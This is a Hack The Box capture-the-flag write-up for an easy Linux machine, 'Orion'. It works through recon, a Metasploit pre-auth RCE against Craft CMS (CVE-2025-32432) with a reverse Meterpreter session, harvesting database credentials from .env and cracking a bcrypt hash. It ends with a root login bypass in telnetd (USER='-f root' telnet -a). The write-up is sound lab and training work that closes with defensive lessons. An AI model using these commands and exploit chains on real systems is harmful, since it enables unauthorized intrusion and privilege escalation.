# HTB Write-Up: Orion

| Field      | Details      |
| ---------- | ------------ |
| Platform   | Hack The Box |
| Difficulty | Easy         |
| OS         | Linux        |
| Author     | shreekara    |
| Date       | July 16, 2026 |

---

## Table of Contents

1. [Reconnaissance](#1-Reconnaissance)
2. [Web enumeration](#2-web-enumeration)
3. [Craft CMS RCE (CVE-2025-32432)](#3-craft-cms-rce-cve-2025-32432)
4. [Leaked DB creds → cracking adam's hash](#4-leaked-db-creds--cracking-adams-hash)
5. [Root via telnetd (CVE-2026-24061)](#5-root-via-telnetd-cve-2026-24061)
6. [Summary](#6-summary)

---

## 1. Reconnaissance

```
sudo nmap -sC -sV -T4 10.129.244.146
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://orion.htb/
```

<img width="1147" height="627" alt="nmap scan" src="https://github.com/user-attachments/assets/226fcec1-cae1-45b7-8e24-0a1e4432c0af" />

Redirects to a hostname, added it:

```
echo "10.129.244.146 orion.htb" | sudo tee -a /etc/hosts
```

---

## 2. Web enumeration

`http://orion.htb/` — Orion Telecom, a telecom company that apparently works with governments and big enterprises.

<img width="1916" height="1048" alt="Orion Telecom homepage" src="https://github.com/user-attachments/assets/8e6b3838-8a32-4d79-a77e-3b48e59388b6" />

Ran gobuster to see what's not linked in the nav:

```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://orion.htb -t 100
```

```
/index    (Status: 200) [Size: 12272]
/assets   (Status: 301) [Size: 178]
/admin    (Status: 302) [Size: 0]  --> /admin/login
/logout   (Status: 302) [Size: 0]
```

<img width="1179" height="479" alt="gobuster output" src="https://github.com/user-attachments/assets/61e49288-9968-4f66-bd59-20604b11639c" />

`/admin` drops you on a login page. Footer says **Craft CMS 5.6.16**, right there for anyone to see.

<img width="1911" height="971" alt="Craft CMS login page, version visible" src="https://github.com/user-attachments/assets/d357d92e-70d5-4fcb-b83d-6808a084fd2a" />

---

## 3. Craft CMS RCE (CVE-2025-32432)

Craft CMS 5.6.16 is vulnerable to CVE-2025-32432. Rough idea of the bug — the `actions/assets/generate-transform` endpoint deserializes an object without properly validating it first, and the CSRF check on it can be bypassed by planting a payload in a session file during the login redirect. So an unauthenticated request ends up getting code execution on the box. There's a Metasploit module for it, easier than writing the request by hand:

```
msfconsole -q
use linux/http/craftcms_preauth_rce_cve_2025_32432
set rhost orion.htb
set lhost tun0
exploit
```

```
[+] The target is vulnerable. Session path leaked
[*] Meterpreter session 1 opened
```

```
meterpreter > shell
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Upgraded to a real tty:

```
script /dev/null -c /bin/bash
```

---

## 4. Leaked DB creds → cracking adam's hash

Checked `.env` first, like always:

```
cat .env
```

```
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_DATABASE=orion
CRAFT_DB_USER=root
CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
```

Logged into MySQL with it:

```
mysql -u root -p orion
# SuperSecureCraft123Pass!
select * from users;
```

One row, admin account, `adam@orion.htb`, bcrypt hash.

<img width="1918" height="423" alt="users table dump" src="https://github.com/user-attachments/assets/d988b7eb-b1be-4c26-b1d2-be59aa5cf44e" />

Bcrypt cracks with hashcat mode 3200:

```
hashcat '$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS' /usr/share/wordlists/rockyou.txt -m 3200 --show
```

```
...:darkangel
```

Cracked pretty much instantly. SSH'd in, grabbed the user flag.

```
ssh adam@orion.htb
# darkangel
cat user.txt
```

---

## 5. Root via telnetd (CVE-2026-24061)

Checked what's listening locally that wasn't reachable from outside:

```
netstat -tulnp
```

```
tcp   0.0.0.0:80     LISTEN
tcp   127.0.0.1:3306 LISTEN
tcp   127.0.0.1:23   LISTEN
```

<img width="789" height="467" alt="netstat output showing port 23" src="https://github.com/user-attachments/assets/47ccc5ff-369e-43ae-84ef-1a56f99478a5" />

Port 23, telnet, localhost only. Checked the version:

```
telnet --version
```

```
telnet (GNU inetutils) 2.7
```

<img width="802" height="173" alt="telnet version" src="https://github.com/user-attachments/assets/614d78f9-e27e-40c7-9e38-63b63f6b3e7c" />

2.7 is affected by CVE-2026-24061 — telnetd forwards the client's `USER` variable straight into `/usr/bin/login` without sanitizing it. Stuff `-f root` in there and `login` treats it as a flag telling it the session's already authenticated, skips the password entirely.

<img width="1917" height="729" alt="CVE-2026-24061 details" src="https://github.com/user-attachments/assets/8c0a4642-cb3e-4539-8126-a6c2263464bb" />

```
USER="-f root" telnet -a 127.0.0.1
```

```
root@orion:~# id
uid=0(root) gid=0(root) groups=0(root)
root@orion:~# cat root.txt
```

<img width="1618" height="812" alt="root shell via telnet auth bypass" src="https://github.com/user-attachments/assets/5c4ef30a-0550-4cc1-8160-f64cebe9f819" />

<img width="883" height="620" alt="Orion solved" src="https://github.com/user-attachments/assets/42e94132-1273-4205-8cc8-becfed9bfd3b" />

---

## 6. Summary

| Step               | What happened                                                    |
| ------------------- | ------------------------------------------------------------------- |
| Recon               | nmap → 22, 80                                                      |
| Web recon           | gobuster → /admin → Craft CMS 5.6.16                              |
| Initial access      | CVE-2025-32432 pre-auth RCE (msf) → shell as www-data              |
| Credential leak     | .env DB password → mysql users table → adam's bcrypt hash          |
| Hash crack          | hashcat mode 3200 + rockyou → cracked instantly, SSH as adam + user flag |
| Privesc             | telnetd 2.7, CVE-2026-24061, USER="-f root" → root shell + root flag |

Notes to self:

- Login page showing the exact CMS version in the footer is just handing over the CVE search for free.
- .env with plaintext DB creds again. Same story as Nexus, secrets shouldn't be sitting in a file the web user can read.
- Root DB password reused nowhere else this time, but the hash still cracked instantly off rockyou — weak user passwords are still the easy way in even when creds aren't literally reused.
- "Bound to localhost" isn't a security boundary once you have any shell. If the service itself has an auth bypass, being local-only just means you need a foothold first, which we already had.
